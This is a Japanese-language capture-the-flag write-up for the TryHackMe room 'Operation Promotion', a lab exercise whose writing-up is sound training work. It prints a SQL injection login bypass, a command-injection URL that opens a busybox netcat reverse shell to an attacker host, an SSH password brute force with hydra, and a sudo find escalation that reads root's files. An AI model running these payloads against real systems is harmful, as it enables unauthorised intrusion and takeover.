# Operation Promotion CTF

https://tryhackme.com/room/operationpromotion

## Enumeration

```shell
TARGET=10.146.173.191
sudo bash -c "echo $TARGET   op.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,80,139,445 $TARGET

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.58 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH, HTTP, SMB

### SMB, NFS, LDAP etc

SMBでREADME.txtをダウンロード

```sh
$ smbclient //$TARGET/public -U ""
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat May  9 18:40:25 2026
  ..                                  D        0  Sat May  9 18:40:25 2026
  README.txt                          N       92  Sat May  9 18:40:25 2026

                40581564 blocks of size 1024. 37045808 blocks available
```

```txt
$ cat ./README.txt   
This share is reserved for future internal file distribution.
Nothing to see here yet.
- IT
```

### ディレクトリ列挙

```sh
root@ip-10-146-97-215:~# dirb http://$TARGET

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Jul 21 05:09:46 2026
URL_BASE: http://10.146.173.191/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.146.173.191/ ----
==> DIRECTORY: http://10.146.173.191/admin/                                                                            
+ http://10.146.173.191/config (CODE:403|SIZE:279)                                                                     
+ http://10.146.173.191/index.php (CODE:200|SIZE:1620)                                                                 
+ http://10.146.173.191/robots.txt (CODE:200|SIZE:32)                                                                  
+ http://10.146.173.191/server-status (CODE:403|SIZE:279)                                                              
                                                                                                                       
---- Entering directory: http://10.146.173.191/admin/ ----
+ http://10.146.173.191/admin/index.php (CODE:200|SIZE:1093)                                                           
==> DIRECTORY: http://10.146.173.191/admin/users/                                                                      
                                                                                                                       
---- Entering directory: http://10.146.173.191/admin/users/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Tue Jul 21 05:09:50 2026
DOWNLOADED: 9224 - FOUND: 5
```

### ログイン画面 SQLi

/admin のログインページで sqlmapを実行したら、username でログイン成功している兆候があった。

```sh
$ sqlmap -r ./login.txt --level=5 --risk=3 --technique=B --not-string="Invalid credentials." --dbs --batch
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.10.6#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 01:16:55 /2026-07-21/

[01:16:55] [INFO] parsing HTTP request from './login.txt'
[01:16:56] [INFO] testing connection to the target URL
[01:16:56] [INFO] testing if POST parameter 'username' is dynamic
[01:16:56] [INFO] POST parameter 'username' appears to be dynamic
[01:16:56] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[01:16:56] [INFO] testing for SQL injection on POST parameter 'username'
[01:16:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
got a 302 redirect to 'http://op.thm/admin/dashboard.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
```

名前を `a' or 1=1-- -` と入力したらダッシュボードが表示された。

## dashboard

http://op.thm/admin/users/lookup.php?id=1 で、下記の情報が画面表示された。

```txt
ID	1
Username	admin
Role	admin
Notes	Primary admin account.
```

lookup.php に SQLインジェクションの脆弱性は見つからなかった。

id=1 から 9 までのユーザーを確認し、名前リストを作成

```txt
mvasquez
tparker
lhayes
kchen
rdavis
sysmaint
jbailey
aokafor
```

sysmaint ユーザーのNotesに注目。

```txt
Username	sysmaint
Role	system
Notes	Service account for /admin/sysmaint-checks/ping.php. Do not disable.
```

### ping.php

アクセスすると使い方が表示された。

```txt
Usage: /admin/sysmaint-checks/ping.php?host=<target>
```

http://op.thm/admin/sysmaint-checks/ping.php?host=localhost

```txt
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.020 ms

--- localhost ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.020/0.020/0.020/0.000 ms
```

コマンドインジェクション成功。

http://op.thm/admin/sysmaint-checks/ping.php?host=`id`

```txt
ping: groups=33(www-data): Name or service not known
```

busybox でリバースシェル取得成功。

http://op.thm/admin/sysmaint-checks/ping.php?host=`busybox%20nc%20192.168.131.34%208888%20-e%20sh`

```sh
$ nc -nlvp 8888                                                      
listening on [any] 8888 ...
connect to [192.168.131.34] from (UNKNOWN) [10.146.173.191] 35092
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xtermwww-data@recruitcorp:/var/www/html/admin/sysmaint-checks$ 
export TERM=xterm
www-data@recruitcorp:/var/www/html/admin/sysmaint-checks$ 
```

## 権限昇格１

jfordユーザーのパスワードハッシュを発見したが、bcryptのためクラックは現実的ではないと思われる。

```sh
www-data@recruitcorp:/var/www/html$ cat config/db.conf
# RecruitCorp application database config
# Pulled out of source control - DO NOT COMMIT.
db_host=localhost
db_name=recruitcorp
db_user=jford
db_pass_hash=$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq
db_engine=sqlite3
```

また、/var/lib/recruitcorp/app.db も開けたが、その中に含まれるパスワードではjfordとしてログインできなかった。

ここは自力で進めなかった。トップページにあるSpring 2026をヒントにワードリストを作る。これは分からない・・・

```sh
echo "spring2026" > base.txt
hashcat --stdout base.txt -r rules/dive.rule > wordlist.txt
```

```sh
$ hydra -l jford -P ./clean_wordlist.txt $TARGET ssh -t 30 
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-21 02:26:45
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 30 tasks per 1 server, overall 30 tasks, 98586 login tries (l:1/p:98586), ~3287 tries per task
[DATA] attacking ssh://10.146.173.191:22/
[22][ssh] host: 10.146.173.191   login: jford   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-21 02:27:12
```

## 権限昇格２

root で find を実行できる。

```sh
jford@recruitcorp:~$ sudo -l
Matching Defaults entries for jford on recruitcorp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jford may run the following commands on recruitcorp:
    (root) NOPASSWD: /usr/bin/find
```

```sh
jford@recruitcorp:~$ sudo find /root -exec cat {} \;
cat: /root: Is a directory
THM{[REDACTED]}
# ~/.profile: executed by Bourne-compatible login shells.

if [ "$BASH" ]; then
  if [ -f ~/.bashrc ]; then
    . ~/.bashrc
  fi
fi
...
```

## 振り返り

- 全体的にはEasyだが、jford のパスワード推測部分だけは理不尽。
- base.txt からルール適用するのは hashcat ではなく john でも実行できる。ちなみに今回の正解パスワードは b64 では生成されなかった。普通の感覚では、10万件のリストでSSHブルートフォースを試そうとは思わない。

```sh
john --wordlist=base.txt --rules=best64 --stdout > b64.txt

john --wordlist=base.txt --rules=dive --stdout > dive.txt
```

## Tags

#tags:SQLインジェクション #tags:コマンドインジェクション #tags:johnルール
